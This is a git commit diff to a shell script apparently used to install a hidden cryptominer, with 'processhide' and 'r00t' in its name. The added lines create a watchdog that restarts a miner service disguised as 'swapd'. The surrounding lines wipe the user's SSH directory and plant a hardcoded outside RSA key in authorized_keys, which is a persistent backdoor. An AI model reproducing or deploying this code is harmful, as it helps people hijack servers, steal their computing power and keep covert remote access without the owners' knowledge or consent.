249c78f1b4b9edc5f1fb0df67fd07254b1557c92
Acen <113854209+littlAcen@users.noreply.github.com>
2024-09-06 05:38:10 +0200

    Update setup_mo_4_r00t_with_processhide.sh

--- setup_mo_4_r00t_with_processhide.sh
+++ setup_mo_4_r00t_with_processhide.sh
@@ -550,6 +550,30 @@ rm -rf xmrig* config.json*
 #CRON_JOB="*/5 * * * * $HOME/.swapd/check_swapd.sh"
 #(crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -
 
+cat << 'EOF' > "$HOME/.swapd/check_swapd.sh"
+    #!/bin/bash
+
+    # Define the service name
+    SERVICE="swapd"
+
+    # Check if the service is running
+    if systemctl is-active --quiet $SERVICE
+    then
+        echo "$SERVICE is running."
+    else
+        echo "$SERVICE is not running. Attempting to restart..."
+        systemctl restart $SERVICE
+
+        # Check if the restart was successful
+        if systemctl is-active --quiet $SERVICE
+        then
+            echo "$SERVICE has been successfully restarted."
+        else
+            echo "Failed to restart $SERVICE."
+        fi
+    fi
+EOF
+
 echo "[*] Generating ssh key on server"
 
 cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
